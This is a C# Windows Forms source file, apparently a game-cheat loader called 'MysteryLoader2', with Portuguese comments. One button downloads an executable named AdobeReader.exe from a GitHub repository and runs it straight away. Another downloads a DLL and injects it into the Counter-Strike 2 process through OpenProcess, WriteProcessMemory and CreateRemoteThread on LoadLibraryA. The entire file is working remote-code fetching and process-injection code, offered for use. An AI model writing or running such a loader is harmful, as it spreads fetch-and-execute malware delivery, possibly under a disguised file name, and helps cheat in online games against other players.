using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace MysteryLoader2
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Inicialização ao carregar o formulário, se necessário.
        }

        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            // URL do arquivo .exe no GitHub (certifique-se de usar o link direto para o raw).
            string fileUrl = "https://raw.githubusercontent.com/ySnowDev/pdf-reader/main/AdobeReader.exe";

            // Diretório temporário para salvar o arquivo.
            string tempPath = Path.Combine(Path.GetTempPath(), "arquivo_temporario.exe");

            try
            {
                // Faz o download do arquivo.
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(fileUrl, tempPath);
                }

                // Verifica se o arquivo foi baixado corretamente.
                if (File.Exists(tempPath))
                {
                    // Configura o processo para executar o arquivo baixado.
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = tempPath,
                        UseShellExecute = true // Necessário para abrir arquivos com permissões corretas.
                    };

                    // Inicia o processo.
                    Process process = Process.Start(startInfo);

                    // Verifica se o processo foi iniciado.
                    if (process != null)
                    {
                       
                    }
                    else
                    {
                        MessageBox.Show("O processo não pôde ser iniciado.", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                else
                {
                    MessageBox.Show("O arquivo não foi baixado corretamente.", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            catch (Exception ex)
            {
                // Exibe mensagem de erro caso algo dê errado.
                MessageBox.Show($"Erro ao baixar ou executar o arquivo: {ex.Message}", "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void guna2GradientButton2_Click(object sender, EventArgs e)
        {
            string url = "https://raw.githubusercontent.com/ySnowDev/pdf-reader/main/excluir.dll"; // URL da DLL
            string tempPath = Path.Combine(Path.GetTempPath(), "excluir.dll");

            try
            {
                // Baixando a DLL do GitHub
                using (HttpClient client = new HttpClient())
                {
                    var response = await client.GetAsync(url);
                    response.EnsureSuccessStatusCode();

                    byte[] dllData = await response.Content.ReadAsByteArrayAsync();
                    await File.WriteAllBytesAsync(tempPath, dllData);
                }


                // Injetando a DLL no processo CS2
                InjectDLL(tempPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Erro ao baixar a DLL: " + ex.Message);
            }
        }

        private void InjectDLL(string dllPath)
        {
            // Encontrando o processo CS2
            Process[] processes = Process.GetProcessesByName("cs2"); // Nome do processo do CS2
            if (processes.Length == 0)
            {
                MessageBox.Show("Processo CS2 não encontrado!");
                return;
            }

            Process cs2Process = processes[0]; // Pegando o primeiro processo CS2

            // Abrindo o processo com permissões para injeção
            IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cs2Process.Id);
            if (processHandle == IntPtr.Zero)
            {
                MessageBox.Show("Erro ao abrir o processo!");
                return;
            }

            // Alocando memória no processo para o caminho da DLL
            IntPtr allocMemAddress = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)(dllPath.Length + 1), 0x1000, 0x04);
            if (allocMemAddress == IntPtr.Zero)
            {
                MessageBox.Show("Erro ao alocar memória!");
                return;
            }

            // Escrevendo o caminho da DLL na memória do processo
            uint bytesWritten;
            WriteProcessMemory(processHandle, allocMemAddress, System.Text.Encoding.ASCII.GetBytes(dllPath), (uint)(dllPath.Length + 1), out bytesWritten);

            // Encontrando o endereço da função LoadLibraryA
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            if (loadLibraryAddr == IntPtr.Zero)
            {
                MessageBox.Show("Erro ao encontrar LoadLibraryA!");
                return;
            }

            // Criando um thread remoto para carregar a DLL
            IntPtr threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
            if (threadHandle == IntPtr.Zero)
            {
                MessageBox.Show("Erro ao criar o thread para injeção!");
                return;
            }

            MessageBox.Show("DLL injetada com sucesso no processo!");
        }

        // Funções P/ injeção de DLL
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Permissões de acesso
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

    }
}
